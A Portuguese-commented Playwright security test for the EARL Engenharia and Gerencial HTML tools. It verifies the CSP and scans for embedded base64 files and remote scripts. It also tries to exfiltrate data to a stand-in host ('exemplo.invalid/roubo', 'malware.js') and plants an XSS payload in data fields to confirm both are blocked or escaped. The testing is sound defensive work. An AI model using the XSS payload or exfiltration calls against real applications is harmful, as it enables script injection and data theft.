// Segurança dos arquivos (e14/g19, 23/11/2026). O antivírus do SharePoint/OneDrive marcou os HTML como "Malicious
// Payload" (falso positivo: modelos Word/Excel/PDF em base64, JSZip em base64 executada e login Microsoft do EARL v115).
// Este teste confere:
//   1. estático: sem arquivos escondidos em base64 (Office, PDF, executável), sem código baixado da internet, sem login
//      Microsoft, e com a política de segurança (CSP) que bloqueia a internet;
//   2. a política não bloqueia nada do uso normal (nenhuma violação ao navegar, gerar e-mail e exportar);
//   3. tentativas de mandar dados para fora (fetch, XHR, imagem, script, beacon, formulário, eval) são bloqueadas;
//   4. texto malicioso nos dados (nomes de cliente, contrato, sonda, poço, produto, função) aparece como texto e não
//      executa — na Engenharia, no e-mail do handover e no Gerencial (arquivo de outra pessoa).
// Uso: node tests/e2e_seguranca.js [EARL_Engenharia.html] [EARL_Gerencial.html] [outros HTML para o item 1 ...]
const {abrir, exportarDados} = require('./harness');
const {montar} = require('../walkthrough/demo');
const fs = require('fs');
const os = require('os');
const path = require('path');
const ENG = path.resolve(process.argv[2] || path.join(__dirname, '..', 'EARL_Engenharia.html'));
const GER = path.resolve(process.argv[3] || path.join(__dirname, '..', '..', 'gerencial', 'EARL_Gerencial.html'));
const EXTRAS = process.argv.slice(4).map(f => path.resolve(f));
const TMP = fs.mkdtempSync(path.join(os.tmpdir(), 'earl-seg-'));
let ok = 0, falhas = 0;
const conf = (c, msg, extra) => {
  if (c) { ok++; console.log('  ✓ ' + msg); } else { falhas++; console.log('  ✗ ' + msg + (extra !== undefined ? ' → ' + JSON.stringify(extra).slice(0, 700) : '')); }
};
const XSS = '"><img src=x onerror="window.__xss=(window.__xss||0)+1"><svg onload="window.__xss=(window.__xss||0)+1">';

/* ---------------------------------------------------------------- 1. estático */
function estatico(arq, completo) {
  const s = fs.readFileSync(arq, 'utf8');
  const nome = path.basename(arq);
  const m = s.match(/<meta http-equiv="Content-Security-Policy" content="([^"]+)">/);
  const csp = m ? m[1] : '';
  conf(!!m, nome + ': tem a política de segurança (CSP)');
  conf(/default-src 'none'/.test(csp) && !/https?:|\*/.test(csp) && !/unsafe-eval/.test(csp) && /connect-src data: blob:;/.test(csp) && /form-action 'none'/.test(csp),
    nome + ': a política não libera nenhum endereço da internet, nem eval', csp);
  if (completo) conf(m && m.index < s.indexOf('<script'), nome + ': a política vem antes de qualquer script');
  const b64 = {'Office/ZIP (UEsDB)': 'UEsDB', 'PDF (JVBER)': 'JVBER', 'executável (TVqQ)': 'TVqQ', 'RAR (UmFyIR)': 'UmFyIR', '7z (N3q8)': 'N3q8ryc'};
  const achados = Object.entries(b64).filter(([, sig]) => new RegExp('[A-Za-z0-9+/]' + sig + '|["\'\\s,]' + sig).test(s)).map(([k]) => k);
  conf(!achados.length, nome + ': nenhum arquivo escondido em base64 (Office, PDF, executável, compactado)', achados);
  const proibidos = ['login.microsoftonline.com', 'graph.microsoft.com', 'msauth.net', 'logic.azure.com', 'atob(JSZIP_B64)'];
  conf(!proibidos.some(p => s.includes(p)), nome + ': sem login Microsoft, Graph, MSAL, Logic Apps nem script em base64', proibidos.filter(p => s.includes(p)));
  const externos = (s.match(/<script[^>]+src=["']https?:[^"']+/gi) || []).concat(s.match(/<link[^>]+href=["']https?:[^"']+/gi) || [])
    .concat(s.match(/loadScriptOnce\(['"]https?:[^'"]+/g) || []).concat(s.match(/\.src\s*=\s*["']https?:\/\/[^"']+\.js/g) || []);
  conf(!externos.length, nome + ': nenhum script ou estilo carregado da internet', externos.slice(0, 5));
}

(async () => {
  console.log('1. Arquivos (estático)');
  estatico(ENG, true);
  estatico(GER, true);
  EXTRAS.forEach(f => estatico(f, false));

  /* ---------------------------------------------------------------- 2. uso normal sem violação */
  console.log('\n2. Engenharia: a política não atrapalha o uso normal');
  const E = await abrir(ENG, {hoje: '2026-11-23'});
  const p = E.page;
  // "servidor" de mentira: todo pedido que sair do navegador para a internet passa por aqui (e é contado)
  const fora = [];
  await E.ctx.route(/^https?:\/\//, r => { fora.push(r.request().url()); r.abort(); });
  await E.ctx.addInitScript(() => {
    window.__csp = [];
    document.addEventListener('securitypolicyviolation', e => window.__csp.push(e.violatedDirective + ' ' + e.blockedURI), true);
  });
  await p.reload();
  await p.waitForSelector('.eng2-card', {timeout: 90000});
  await montar(p);
  const violacoes = async () => p.evaluate(() => [].concat(...Array.from(window.frames).map(f => { try { return f.__csp || []; } catch (e) { return []; } }), window.__csp || []));
  const baixar = async (acao) => { const d = p.waitForEvent('download', {timeout: 20000}); await acao(); const x = await d; const f = path.join(TMP, x.suggestedFilename()); await x.saveAs(f); return f; };
  await p.locator('.eng2-card', {hasText: 'P&A'}).first().click();
  await p.waitForSelector('.eng2-ctbar');
  for (const aba of ['Calendário', 'Lista', 'Consumo e receita', 'Inventário das sondas', 'Lista']) { if (aba === 'Consumo e receita') await p.evaluate(() => window.engPlanView('rec')); else await p.locator('.db-tab', {hasText: aba}).first().click(); /* e18: a tela não tem mais a pílula */ await p.waitForTimeout(400); }
  const t = p.locator('.eng-lista-todas'); if (await t.count()) await t.click();
  await p.locator('table.db-table tbody tr', {hasText: '7-ABL-40-RJS'}).first().locator('button', {hasText: 'Handover'}).click();
  const cont = p.locator('button:has-text("Continuar →")'); await p.waitForTimeout(400); if (await cont.count()) await cont.first().click();
  await p.waitForSelector('.ho-modal');
  await p.locator('.ho-modal button', {hasText: 'Continuar para o e-mail'}).click();
  await p.waitForSelector('.hm-modal');
  await p.locator('.hm-tab tbody tr').first().locator('input[type=checkbox]').first().check();
  const eml = await baixar(() => p.click('.hm-gerar'));
  conf(/\.eml$/.test(eml) && fs.statSync(eml).size > 1000, 'e-mail do handover gerado (.eml)', path.basename(eml));
  for (let i = 0; i < 3; i++) { const x = p.locator('.modal-close:visible'); if (!(await x.count())) break; await x.last().click(); await p.waitForTimeout(300); }
  const bk = await baixar(() => exportarDados(p));
  conf(fs.statSync(bk).size > 1000, 'cópia de segurança exportada', path.basename(bk));
  await p.click('.eng-tools .eng-planilhas');
  await p.waitForTimeout(500);
  await baixar(() => p.locator('button', {hasText: /Baixar as \d planilhas/}).first().click());
  for (let i = 0; i < 3; i++) { const x = p.locator('.modal-close:visible'); if (!(await x.count())) break; await x.last().click(); await p.waitForTimeout(300); }
  await p.evaluate(() => window.engArquivoGerencial());
  await p.waitForTimeout(500);
  await baixar(() => p.locator('button', {hasText: 'Gerar arquivo'}).first().click());
  for (let i = 0; i < 3; i++) { const x = p.locator('.modal-close:visible'); if (!(await x.count())) break; await x.last().click(); await p.waitForTimeout(300); }
  conf(!(await violacoes()).length, 'nenhuma violação da política ao navegar, gerar o e-mail e exportar', await violacoes());
  conf(!fora.length, 'nenhum acesso à internet durante o uso', fora.slice(0, 5));

  /* ---------------------------------------------------------------- 3. tentativas de mandar dados para fora */
  console.log('\n3. Tentativas de mandar dados para fora (como faria um código malicioso)');
  const tent = async pg => pg.evaluate(async () => {
    const r = {};
    window.__csp = [];
    try { await fetch('https://exemplo.invalid/roubo?d=1'); r.fetch = 'passou'; } catch (e) { r.fetch = 'bloqueado'; }
    r.xhr = await new Promise(res => { try { const x = new XMLHttpRequest(); x.open('GET', 'https://exemplo.invalid/x'); x.onerror = () => res('bloqueado'); x.onload = () => res('passou'); x.send(); } catch (e) { res('bloqueado'); } });
    try { r.beacon = navigator.sendBeacon('https://exemplo.invalid/b', 'dados') ? 'passou' : 'bloqueado'; } catch (e) { r.beacon = 'bloqueado'; }
    try { eval('1+1'); r.eval = 'passou'; } catch (e) { r.eval = 'bloqueado'; }
    try { new Function('return 1')(); r.funcao = 'passou'; } catch (e) { r.funcao = 'bloqueado'; }
    const img = new Image(); img.src = 'https://exemplo.invalid/p.png?d=1';
    const sc = document.createElement('script'); sc.src = 'https://exemplo.invalid/malware.js'; document.head.appendChild(sc);
    const f = document.createElement('form'); f.action = 'https://exemplo.invalid/form'; f.method = 'post'; f.target = '_blank'; document.body.appendChild(f);
    try { f.submit(); } catch (e) {}
    f.remove();
    await new Promise(res => setTimeout(res, 800));
    r.violacoes = window.__csp.map(v => v.split(' ')[0]);
    return r;
  });
  const T1 = await tent(p);
  // o beacon devolve true mesmo bloqueado (o Chrome enfileira e a política barra): conta pelas violações de connect-src
  conf(T1.fetch === 'bloqueado' && T1.xhr === 'bloqueado' && T1.violacoes.filter(v => v === 'connect-src').length >= 3, 'Engenharia: fetch, XHR e beacon para a internet bloqueados', T1);
  conf(T1.eval === 'bloqueado' && T1.funcao === 'bloqueado', 'Engenharia: eval e new Function (executar texto como código) bloqueados', T1);
  conf(['img-src', 'script-src-elem', 'form-action'].every(d => T1.violacoes.some(v => v.indexOf(d.split('-elem')[0]) === 0)), 'Engenharia: imagem, script e formulário para a internet bloqueados', T1.violacoes);
  conf(!fora.length, 'Engenharia: nenhum pedido chegou à rede (o navegador barra antes de sair)', fora.slice(0, 5));

  /* ---------------------------------------------------------------- 4. texto malicioso nos dados */
  console.log('\n4. Texto malicioso nos dados (como num arquivo importado de outra pessoa)');
  await p.evaluate(X => {
    const d = loadDB();
    const pa = d.contratos.find(c => c.id === 'ct_demo_pa');
    pa.name = 'P&A ' + X; pa.clientName = 'Petrobras ' + X;
    const cl = d.clients.find(c => c.name === 'Petrobras'); if (cl) cl.name = 'Petrobras ' + X;
    d.plannedJobs.filter(j => j.contratoId === 'ct_demo_pa').forEach(j => { j.clienteName = 'Petrobras ' + X; j.well = j.well + X; j.notes = 'obs ' + X; j.salesOrder = j.salesOrder || '460100199';
      j.chems.forEach(c => { c.name = c.name + X; }); j.peopleNeeds.forEach(n => { n.funcao = n.funcao + X; }); j.casingNeeds.forEach(c => { c.name = c.name + X; }); });
    const rg = d.rigs.find(r => r.id === d.plannedJobs[0].rigId); rg.name = rg.name + X;
    d.quimicos.slice(0, 5).forEach(q => { q.nome = q.nome + X; });
    d.casingEquip.slice(0, 3).forEach(c => { c.name = c.name + X; });
    (d.invSondas || []).forEach(v => { v.obs = 'obs ' + X; v.itens.forEach(i => { i.nome = i.nome + X; }); });
    d.hoMail.nome = 'Ana ' + X;
    saveDB(d);
  }, XSS);
  await p.reload();
  await p.waitForSelector('.eng2-card', {timeout: 60000});
  await p.waitForTimeout(1500);
  const xss = async pg => pg.evaluate(() => [window].concat(Array.from(window.frames)).reduce((a, w) => { try { return a + (w.__xss || 0); } catch (e) { return a; } }, 0));
  await p.locator('.eng2-card', {hasText: 'P&A'}).first().click();
  await p.waitForSelector('.eng2-ctbar');
  for (const aba of ['Gantt', 'Calendário', 'Lista', 'Handovers', 'Consumo e receita', 'Inventário das sondas', 'Lista']) { if (aba === 'Consumo e receita') await p.evaluate(() => window.engPlanView('rec')); else await p.locator('.db-tab', {hasText: aba}).first().click(); /* e18: a tela não tem mais a pílula */ await p.waitForTimeout(500); }
  const t2 = p.locator('.eng-lista-todas'); if (await t2.count()) await t2.click();
  const corpo = await p.textContent('body');
  conf(corpo.includes('onerror="window.__xss'), 'o texto malicioso aparece como texto na tela (não vira código)');
  // filtro das tabelas (lista de valores da coluna)
  await p.locator('table.db-table thead th').nth(2).locator('.etf-b').click();
  await p.waitForTimeout(500);
  conf((await p.locator('#etfPop').textContent()).includes('<img src=x'), 'filtro da coluna mostra o valor como texto');
  await p.keyboard.press('Escape');
  // operação: editar e consumo
  const linha = p.locator('table.db-table tbody tr', {hasText: '7-ABL-40-RJS'}).first();
  await linha.locator('button', {hasText: 'Consumo'}).click();
  await p.waitForSelector('.ec-cons-modal'); await p.waitForTimeout(500);
  for (let i = 0; i < 3; i++) { const x = p.locator('.modal-close:visible'); if (!(await x.count())) break; await x.last().click(); await p.waitForTimeout(300); const c = p.locator('button:text-is("Fechar sem salvar")'); if (await c.count()) await c.first().click(); }
  await linha.locator('button', {hasText: 'Handover'}).click();
  await p.waitForTimeout(400); if (await cont.count()) await cont.first().click();
  await p.waitForSelector('.ho-modal');
  await p.locator('.ho-modal button', {hasText: 'Continuar para o e-mail'}).click();
  await p.waitForSelector('.hm-modal');
  await p.locator('.hm-prev summary').click(); await p.waitForTimeout(800);
  await p.locator('.hm-tab tbody tr').first().locator('input[type=checkbox]').first().check();
  const eml2 = await baixar(() => p.click('.hm-gerar'));
  const emlTxt = fs.readFileSync(eml2, 'utf8');
  const partes = emlTxt.split(/\r?\n\r?\n/).filter(b => /^[A-Za-z0-9+/=\r\n]+$/.test(b.trim()) && b.trim().length > 200).map(b => Buffer.from(b.replace(/\s+/g, ''), 'base64').toString('utf8'));
  const htmlMail = partes.find(x => /<html|<table/i.test(x)) || emlTxt;
  conf(!/<img src=x onerror/i.test(htmlMail) && !/<svg onload/i.test(htmlMail), 'e-mail do handover: o texto malicioso vai escapado (não vira HTML)', (htmlMail.match(/.{60}<img src=x.{20}/) || [''])[0]);
  for (let i = 0; i < 3; i++) { const x = p.locator('.modal-close:visible'); if (!(await x.count())) break; await x.last().click(); await p.waitForTimeout(300); }
  // banco de químicos e Gerencial embutido
  await p.click('.eng-tools .eng-quimicos'); await p.waitForSelector('.ec-quim-tab'); await p.waitForTimeout(500);
  for (let i = 0; i < 3; i++) { const x = p.locator('.modal-close:visible'); if (!(await x.count())) break; await x.last().click(); await p.waitForTimeout(300); }
  await p.click('.eng2-ctbar-sw'); await p.waitForSelector('.fr-tab-ind'); await p.click('.fr-tab-ind'); await p.waitForSelector('.ec-ger-frame'); await p.waitForTimeout(2500);
  const pac = await baixar(async () => { await p.evaluate(() => window.engArquivoGerencial()); await p.waitForTimeout(500); await p.locator('button', {hasText: 'Gerar arquivo'}).first().click(); });
  for (let i = 0; i < 3; i++) { const x = p.locator('.modal-close:visible'); if (!(await x.count())) break; await x.last().click(); await p.waitForTimeout(300); }
  conf((await xss(p)) === 0, 'Engenharia: nenhum código malicioso executou (telas, filtro, consumo, handover, e-mail, químicos, Gerencial embutido)', await xss(p));
  console.log('    (bloqueios registrados pela política: %s)', JSON.stringify((await violacoes()).slice(0, 4)));
  conf(!E.errs.filter(e => !/Refused to (load|connect|execute|send form|evaluate)|Content Security Policy|exemplo\.invalid|ERR_FAILED|net::/i.test(e)).length, 'Engenharia: nenhum erro de JavaScript', E.errs.slice(0, 5));
  await E.browser.close();

  /* ---------------------------------------------------------------- Gerencial com o arquivo "malicioso" */
  console.log('\n5. Gerencial: arquivo de outra pessoa com texto malicioso');
  const G = await abrir(GER, {hoje: '2026-11-23'});
  const q = G.page;
  const foraG = [];
  await G.ctx.route(/^https?:\/\//, r => { foraG.push(r.request().url()); r.abort(); });
  await G.ctx.addInitScript(() => { window.__csp = []; document.addEventListener('securitypolicyviolation', e => window.__csp.push(e.violatedDirective + ' ' + e.blockedURI), true); });
  await q.reload();
  await q.setInputFiles('#inArq', pac);
  await q.waitForTimeout(1500);
  for (const b of await q.locator('[data-tab]').all()) { await b.click().catch(() => {}); await q.waitForTimeout(500); }
  const gTxt = await q.textContent('body');
  conf(gTxt.includes('onerror="window.__xss') || gTxt.includes('<img src=x'), 'Gerencial: o texto malicioso aparece como texto');
  conf((await xss(q)) === 0, 'Gerencial: nenhum código malicioso executou', await xss(q));
  const T2 = await tent(q);
  conf(T2.fetch === 'bloqueado' && T2.xhr === 'bloqueado' && T2.violacoes.filter(v => v === 'connect-src').length >= 3 && T2.eval === 'bloqueado', 'Gerencial: internet (fetch, XHR, beacon) e eval bloqueados', T2);
  conf(!foraG.length, 'Gerencial: nenhum pedido chegou à rede', foraG.slice(0, 5));
  conf(!G.errs.filter(e => !/Refused to (load|connect|execute|send form|evaluate)|Content Security Policy|exemplo\.invalid|ERR_FAILED|net::/i.test(e)).length, 'Gerencial: nenhum erro de JavaScript', G.errs.slice(0, 5));
  await G.browser.close();

  console.log('\n%d ok, %d falha(s)', ok, falhas);
  process.exit(falhas ? 1 : 0);
})().catch(e => { console.error(e); process.exit(2); });
